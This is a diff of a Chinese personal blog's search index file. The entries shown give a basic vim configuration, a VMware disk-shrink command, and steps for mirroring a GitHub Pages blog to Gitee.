+    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>经常需要在不同的Linux上切换，有些Linux默认配置的vim用起来很不舒服，所以记录一个简单的vim配置，用起来会顺手一点。</p>
+<h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p>将下面代码保存到<code>~/.vimrc</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">syntax on</span><br><span class="line">filetype indent on</span><br><span class="line">set nocp</span><br><span class="line">set nocompatible</span><br><span class="line">set autoread</span><br><span class="line">set mouse&#x3D;</span><br><span class="line">set showcmd</span><br><span class="line">set showmatch</span><br><span class="line">set autoindent</span><br><span class="line">set softtabstop&#x3D;4</span><br><span class="line">set shiftwidth&#x3D;4</span><br><span class="line">set tabstop&#x3D;4</span><br><span class="line">set nu</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>VMware虚拟机磁盘空间压缩</title>
+    <url>/2019/07/11/VMware%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%A3%81%E7%9B%98%E7%A9%BA%E9%97%B4%E5%8E%8B%E7%BC%A9/</url>
+    <content><![CDATA[<p>可以使用VMware官方的vmware tools进行压缩。<br>压缩前需要删除虚拟机的快照、链接克隆等，然后在虚拟机中执行：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vmware-toolbox-cmd disk shrink /</span><br></pre></td></tr></table></figure>
+<p>执行后等待进度条结束即可：<br><img src="/2019/07/11/VMware%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%A3%81%E7%9B%98%E7%A9%BA%E9%97%B4%E5%8E%8B%E7%BC%A9/2020-08-19-18-33-08.png"></p>
+<a id="more"></a>
+
+<p>压缩前忘了截图了，删除快照等后大概占用33G，实际虚拟机硬盘使用：<br><img src="/2019/07/11/VMware%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%A3%81%E7%9B%98%E7%A9%BA%E9%97%B4%E5%8E%8B%E7%BC%A9/2020-08-19-18-33-34.png"></p>
+<p>压缩后占用：<br><img src="/2019/07/11/VMware%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%A3%81%E7%9B%98%E7%A9%BA%E9%97%B4%E5%8E%8B%E7%BC%A9/2020-08-19-18-33-47.png"></p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.modb.pro/db/13321">VMware 虚拟机磁盘占用过大怎么办？</a></p>
+]]></content>
+      <categories>
+        <category>折腾</category>
+      </categories>
+      <tags>
+        <tag>折腾</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>kali iptables 配置自启动加载</title>
     <url>/2020/08/21/kali-iptables-%E9%85%8D%E7%BD%AE%E8%87%AA%E5%90%AF%E5%8A%A8%E5%8A%A0%E8%BD%BD/</url>
     <content><![CDATA[<h3 id="创建启动配置文件"><a href="#创建启动配置文件" class="headerlink" title="创建启动配置文件"></a>创建启动配置文件</h3><p>编辑创建以下文件：</p>
@@ -472,16 +485,18 @@
       </tags>
   </entry>
   <entry>
-    <title>vim简易快捷配置</title>
-    <url>/2020/08/21/vim%E7%AE%80%E6%98%93%E5%BF%AB%E6%8D%B7%E9%85%8D%E7%BD%AE/</url>
-    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>经常需要在不同的Linux上切换，有些Linux默认配置的vim用起来很不舒服，所以记录一个简单的vim配置，用起来会顺手一点。</p>
-<h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p>将下面代码保存到<code>~/.vimrc</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">syntax on</span><br><span class="line">filetype indent on</span><br><span class="line">set nocp</span><br><span class="line">set nocompatible</span><br><span class="line">set autoread</span><br><span class="line">set mouse&#x3D;</span><br><span class="line">set showcmd</span><br><span class="line">set showmatch</span><br><span class="line">set autoindent</span><br><span class="line">set softtabstop&#x3D;4</span><br><span class="line">set shiftwidth&#x3D;4</span><br><span class="line">set tabstop&#x3D;4</span><br><span class="line">set nu</span><br></pre></td></tr></table></figure>]]></content>
+    <title>同步GitHub Page博客到Gitee</title>
+    <url>/2020/08/21/%E5%90%8C%E6%AD%A5GitHub-Page%E5%8D%9A%E5%AE%A2%E5%88%B0Gitee/</url>
+    <content><![CDATA[<h3 id="Gitee-Page"><a href="#Gitee-Page" class="headerlink" title="Gitee Page"></a>Gitee Page</h3><p>码云 Pages是一个免费的静态网页托管服务，您可以使用 码云 Pages 托管博客、项目官网等静态网页。如果您使用过 Github Pages 那么您会很快上手使用码云的 Pages服务。<br>相对 Github Pages 来说，码云 Gitee Pages在国内访问会快很多。使用简单的方法就能让 Gitee Page 同步 Github Pages。</p>
+<a id="more"></a>
+<h3 id="同步方法"><a href="#同步方法" class="headerlink" title="同步方法"></a>同步方法</h3><p>在首页，选择新建仓库<br><img src="/2020/08/21/%E5%90%8C%E6%AD%A5GitHub-Page%E5%8D%9A%E5%AE%A2%E5%88%B0Gitee/2020-08-21-16-52-22.png"><br>选择导入已有仓库，并修改仓库名称和路径为Gitee的用户名，因为我已经导入过了，所以这里显示重复<br><img src="/2020/08/21/%E5%90%8C%E6%AD%A5GitHub-Page%E5%8D%9A%E5%AE%A2%E5%88%B0Gitee/2020-08-21-16-53-47.png"><br>导入后是这样子的<br><img src="/2020/08/21/%E5%90%8C%E6%AD%A5GitHub-Page%E5%8D%9A%E5%AE%A2%E5%88%B0Gitee/2020-08-21-16-55-00.png"><br>在服务中启动Gitee Pages<br><img src="/2020/08/21/%E5%90%8C%E6%AD%A5GitHub-Page%E5%8D%9A%E5%AE%A2%E5%88%B0Gitee/2020-08-21-16-55-24.png"><br>检查用户名和url是否对应，然后点击更新<br><img src="/2020/08/21/%E5%90%8C%E6%AD%A5GitHub-Page%E5%8D%9A%E5%AE%A2%E5%88%B0Gitee/2020-08-21-16-55-53.png"><br>更新后即可通过页面的url访问到博客。</p>
+<h3 id="GitHub-Page更新"><a href="#GitHub-Page更新" class="headerlink" title="GitHub Page更新"></a>GitHub Page更新</h3><p>如果GitHub Page更新了，可以点击码云的同步按钮同步博客内容：<br><img src="/2020/08/21/%E5%90%8C%E6%AD%A5GitHub-Page%E5%8D%9A%E5%AE%A2%E5%88%B0Gitee/2020-08-21-17-04-38.png"></p>
+]]></content>
       <categories>
-        <category>Linux</category>
+        <category>折腾</category>
       </categories>
       <tags>
-        <tag>Linux</tag>
+        <tag>折腾</tag>
       </tags>
   </entry>
   <entry>
@@ -551,21 +566,6 @@
       <tags>
         <tag>渗透测试</tag>
         <tag>WEB</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>同步GitHub Page博客到Gitee</title>
-    <url>/2020/08/21/%E5%90%8C%E6%AD%A5GitHub-Page%E5%8D%9A%E5%AE%A2%E5%88%B0Gitee/</url>
-    <content><![CDATA[<h3 id="Gitee-Page"><a href="#Gitee-Page" class="headerlink" title="Gitee Page"></a>Gitee Page</h3><p>码云 Pages是一个免费的静态网页托管服务，您可以使用 码云 Pages 托管博客、项目官网等静态网页。如果您使用过 Github Pages 那么您会很快上手使用码云的 Pages服务。<br>相对 Github Pages 来说，码云 Gitee Pages在国内访问会快很多。使用简单的方法就能让 Gitee Page 同步 Github Pages。</p>
-<a id="more"></a>
-<h3 id="同步方法"><a href="#同步方法" class="headerlink" title="同步方法"></a>同步方法</h3><p>在首页，选择新建仓库<br><img src="/2020/08/21/%E5%90%8C%E6%AD%A5GitHub-Page%E5%8D%9A%E5%AE%A2%E5%88%B0Gitee/2020-08-21-16-52-22.png"><br>选择导入已有仓库，并修改仓库名称和路径为Gitee的用户名，因为我已经导入过了，所以这里显示重复<br><img src="/2020/08/21/%E5%90%8C%E6%AD%A5GitHub-Page%E5%8D%9A%E5%AE%A2%E5%88%B0Gitee/2020-08-21-16-53-47.png"><br>导入后是这样子的<br><img src="/2020/08/21/%E5%90%8C%E6%AD%A5GitHub-Page%E5%8D%9A%E5%AE%A2%E5%88%B0Gitee/2020-08-21-16-55-00.png"><br>在服务中启动Gitee Pages<br><img src="/2020/08/21/%E5%90%8C%E6%AD%A5GitHub-Page%E5%8D%9A%E5%AE%A2%E5%88%B0Gitee/2020-08-21-16-55-24.png"><br>检查用户名和url是否对应，然后点击更新<br><img src="/2020/08/21/%E5%90%8C%E6%AD%A5GitHub-Page%E5%8D%9A%E5%AE%A2%E5%88%B0Gitee/2020-08-21-16-55-53.png"><br>更新后即可通过页面的url访问到博客。</p>
-<h3 id="GitHub-Page更新"><a href="#GitHub-Page更新" class="headerlink" title="GitHub Page更新"></a>GitHub Page更新</h3><p>如果GitHub Page更新了，可以点击码云的同步按钮同步博客内容：<br><img src="/2020/08/21/%E5%90%8C%E6%AD%A5GitHub-Page%E5%8D%9A%E5%AE%A2%E5%88%B0Gitee/2020-08-21-17-04-38.png"></p>
-]]></content>
-      <categories>
-        <category>折腾</category>
-      </categories>
-      <tags>
-        <tag>折腾</tag>
       </tags>
   </entry>
   <entry>
